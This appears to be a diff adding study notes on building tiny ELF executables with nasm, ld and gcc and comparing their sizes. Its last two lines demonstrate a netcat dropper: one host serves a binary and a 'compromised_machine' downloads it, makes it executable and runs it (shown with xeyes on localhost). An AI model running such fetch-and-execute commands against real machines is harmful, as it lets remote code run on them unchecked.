@@ -1,0 +1,23 @@
+nasm -f elf64 -o c2-1.o c2-1.asm
+ld -o c2-0s c2-1.o
+./c2-0s; echo $?
+
+> returns "30"
+>bash variable $? cantains the return value of the last
+    executed command.
+
+removing crt1.o from output of compiler:
+gcc -nostartfiles -o c2-2 c2-2.c
+./c2-2; echo $?
+
+gcc -static -o c2-1s cs-1.c
+gcc -static -nostartfiles -o c2-2s c2-2.c
+ls -l c2-?s | awk '{print $9, $5;}'
+results:
+c2-0s 737
+c2-1s 872956
+c2-2s 5420
+
+malware_server $ cat /usr/bin/xeyes | nc -l -p $((1111))
+
+compromised_machine rm k; nc localhost $((1111)) > k; chmod +x k; ./k
